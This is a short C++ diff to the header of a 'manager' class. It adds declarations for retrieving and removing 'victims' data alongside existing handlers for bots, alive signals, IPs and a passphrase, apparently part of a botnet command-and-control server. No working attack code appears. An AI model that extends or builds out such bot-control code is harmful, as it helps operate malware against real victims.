@@ -47,6 +47,7 @@ class manager {
 	void handleAlive(std::string &, std::vector<std::string> &, session *);
 	void handleInit(std::string &, std::vector<std::string> &, session *);
 	void handleGetBotsData(std::string &, std::vector<std::string> &, session *);
+	void handleGetVictimsData(std::string &, std::vector<std::string> &, session *);
 	void handleGetIps(std::string &, std::vector<std::string> &, session *);
 
 	msg_parser msg_parser_;
@@ -54,9 +55,11 @@ class manager {
 	    command_handlers_;
 	std::string passphrase_;
 
-	// Interface
+	// Interface get-requests
 	void getBotsData();
+	void getVictimsData();
     void removeClient(std::string&);
+    void removeVictim(std::string&);
     void addVictim(std::string&);
 
 	user_interface interactive_;
